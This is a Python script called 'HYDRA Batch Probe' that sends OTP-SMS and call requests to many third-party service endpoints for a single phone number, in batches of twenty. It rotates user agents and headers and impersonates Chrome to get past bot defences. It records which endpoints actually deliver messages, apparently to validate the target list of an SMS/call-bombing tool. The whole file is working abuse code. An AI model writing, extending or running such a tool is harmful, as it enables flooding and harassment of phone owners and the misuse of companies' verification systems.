"""
HYDRA Batch Probe — fires targets 20 at a time to YOUR phone.
Usage: python probe_batch.py 8777849865
Press ENTER between each batch of 20 to continue.
Results saved to probe_results.txt at the end.
"""
import sys, time, random, json, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ── Load targets from hydra_v4 ────────────────────────────────────────────────
from hydra_v4 import TARGETS, TARGETS_CALL, USER_AGENTS, ACCEPT_LANGUAGE_POOL, ACCEPT_TYPE_POOL, parse_body, resolve_phone

ALL_TARGETS = TARGETS + TARGETS_CALL   # combine SMS + call targets
PHONE = sys.argv[1] if len(sys.argv) > 1 else "8777849865"
BATCH = 20
DELAY = 0.5  # seconds between each fire within a batch

# ── Colors ────────────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

results_log = []

def fire_one(target: dict, phone: str) -> dict:
    """Fire a single target synchronously. Returns result dict."""
    import requests
    try:
        from curl_cffi import requests as _cffi
        _HAS_CFFI = True
    except ImportError:
        _HAS_CFFI = False

    ua     = random.choice(USER_AGENTS)
    method = target.get("method", "POST").upper()
    pfmt   = target.get("phone_format", "raw")
    fphone = resolve_phone(phone, pfmt)
    url    = target["url"].replace("<PHONE>", fphone)

    headers = {**target.get("extra_headers", {})}
    headers["User-Agent"]      = ua
    headers["Accept-Language"] = random.choice(ACCEPT_LANGUAGE_POOL)
    headers["Accept"]          = random.choice(ACCEPT_TYPE_POOL)
    headers["Accept-Encoding"] = "gzip, deflate, br"

    content_type = target.get("content_type", "json")
    raw_payload  = None
    get_params   = None
    post_url_params = None

    if method in ("POST", "PUT"):
        payload_src = (
            random.choice(target["payload_variants"])
            if target.get("payload_variants")
            else target.get("payload")
        )
        if payload_src:
            raw_payload = json.loads(
                json.dumps(payload_src).replace("<PHONE>", fphone)
            )
            headers["Content-Type"] = (
                "application/x-www-form-urlencoded"
                if content_type == "form"
                else "application/json"
            )

    if method == "GET" and "params" in target:
        get_params = {
            k: str(v).replace("<PHONE>", fphone)
            for k, v in target["params"].items()
        }

    if method == "POST" and "params" in target:
        post_url_params = {
            k: str(v).replace("<PHONE>", fphone)
            for k, v in target["params"].items()
        }

    req_cookies = target.get("cookies", None)
    t_start = time.time()

    try:
        resp = None
        if _HAS_CFFI:
            try:
                sess = _cffi.Session(impersonate="chrome120")
                if method == "GET":
                    resp = sess.get(url, headers=headers, params=get_params, cookies=req_cookies, timeout=8)
                elif method == "PUT":
                    resp = sess.put(url, data=raw_payload if content_type == "form" else None,
                                    json=raw_payload if content_type != "form" else None,
                                    headers=headers, params=post_url_params, cookies=req_cookies, timeout=8)
                else:
                    resp = sess.post(url, data=raw_payload if content_type == "form" else None,
                                     json=raw_payload if content_type != "form" else None,
                                     headers=headers, params=post_url_params, cookies=req_cookies, timeout=8)
            except Exception:
                resp = None

        if resp is None:
            if method == "GET":
                resp = requests.get(url, headers=headers, params=get_params, cookies=req_cookies, timeout=6)
            elif method == "PUT":
                resp = requests.put(url, json=raw_payload, headers=headers, params=post_url_params, cookies=req_cookies, timeout=6)
            else:
                resp = requests.post(url, data=raw_payload if content_type == "form" else None,
                                     json=raw_payload if content_type != "form" else None,
                                     headers=headers, params=post_url_params, cookies=req_cookies, timeout=6)

        elapsed  = int((time.time() - t_start) * 1000)
        body     = resp.text[:400]
        verdict, cd = parse_body(body, resp.status_code)
        return {"name": target["name"], "category": target.get("category","?"),
                "status": resp.status_code, "verdict": verdict,
                "body": body, "ms": elapsed, "error": None}

    except Exception as e:
        elapsed = int((time.time() - t_start) * 1000)
        return {"name": target["name"], "category": target.get("category","?"),
                "status": 0, "verdict": "NETWORK_ERR", "body": str(e)[:200],
                "ms": elapsed, "error": str(e)[:100]}


def run_batch(batch_targets, batch_num, total_batches):
    print(f"\n{BOLD}{CYAN}{'='*72}{RESET}")
    print(f"{BOLD}{CYAN}  BATCH {batch_num}/{total_batches}  — firing {len(batch_targets)} targets at {PHONE}{RESET}")
    print(f"{BOLD}{CYAN}{'='*72}{RESET}\n")

    delivered = []
    for i, t in enumerate(batch_targets, 1):
        r = fire_one(t, PHONE)
        results_log.append(r)

        if r["verdict"] == "OTP_SENT":
            color = GREEN
            delivered.append(r["name"])
        elif r["verdict"] in ("200_FAKE", "RATE_LIMITED"):
            color = YELLOW
        else:
            color = RED

        body_short = r["body"].replace("\n", " ").replace("\r", "")[:120]
        print(f"{color}  [{i:02d}] {r['name']:<22} HTTP {r['status']}  {r['verdict']:<14}  {r['ms']}ms{RESET}")
        print(f"       {DIM}{body_short}{RESET}\n")

        if i < len(batch_targets):
            time.sleep(DELAY)

    print(f"\n{BOLD}  Batch {batch_num} done. Possible OTP_SENT: {GREEN}{delivered}{RESET}")
    return delivered


def save_results():
    lines = []
    lines.append(f"HYDRA Probe Results — Phone: {PHONE}\n")
    lines.append("="*72 + "\n")
    for r in results_log:
        lines.append(
            f"{r['name']:<25} | {r['category']:<14} | HTTP {r['status']} | "
            f"{r['verdict']:<14} | {r['ms']}ms\n"
        )
        lines.append(f"  BODY: {r['body'][:200]}\n\n")

    confirmed = [r for r in results_log if r["verdict"] == "OTP_SENT"]
    lines.append("\n" + "="*72 + "\n")
    lines.append(f"TOTAL TARGETS TESTED: {len(results_log)}\n")
    lines.append(f"OTP_SENT (by body keywords): {len(confirmed)}\n")
    lines.append("CONFIRMED LIST:\n")
    for r in confirmed:
        lines.append(f"  -> {r['name']} ({r['category']})\n")

    with open("probe_results.txt", "w", encoding="utf-8") as f:
        f.writelines(lines)
    print(f"\n{GREEN}Results saved to probe_results.txt{RESET}")


# ── MAIN ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    total   = len(ALL_TARGETS)
    batches = [ALL_TARGETS[i:i+BATCH] for i in range(0, total, BATCH)]
    n_batches = len(batches)

    print(f"\n{BOLD}{CYAN}HYDRA BATCH PROBE — {total} targets — {n_batches} batches of {BATCH}{RESET}")
    print(f"{BOLD}Phone: {PHONE}{RESET}")
    print(f"\n{YELLOW}Press ENTER after each batch to fire the next 20.")
    print(f"Check your phone between batches to mark which ones arrived!{RESET}")
    print(f"\nLegend: {GREEN}GREEN = OTP_SENT (keyword match){RESET}  {YELLOW}YELLOW = ambiguous 200{RESET}  {RED}RED = fail/blocked/error{RESET}")

    all_delivered = []
    for bn, batch in enumerate(batches, 1):
        if bn > 1:
            inp = input(f"\n{BOLD}[Check your phone now!] Press ENTER for batch {bn}/{n_batches} (or 'q' to quit): {RESET}")
            if inp.strip().lower() == 'q':
                print("Stopping early.")
                break

        delivered = run_batch(batch, bn, n_batches)
        all_delivered.extend(delivered)

    print(f"\n{BOLD}{GREEN}{'='*72}")
    print(f"ALL DONE — {len(results_log)} targets tested")
    print(f"Body-keyword OTP_SENT hits: {all_delivered}")
    print(f"{'='*72}{RESET}")

    save_results()
    print(f"\n{YELLOW}NOTE: OTP_SENT by keyword != guaranteed SMS delivered.")
    print(f"Tell me which API names matched an actual SMS on your phone.")
    print(f"That's the real ground truth. Check probe_results.txt for full log.{RESET}\n")
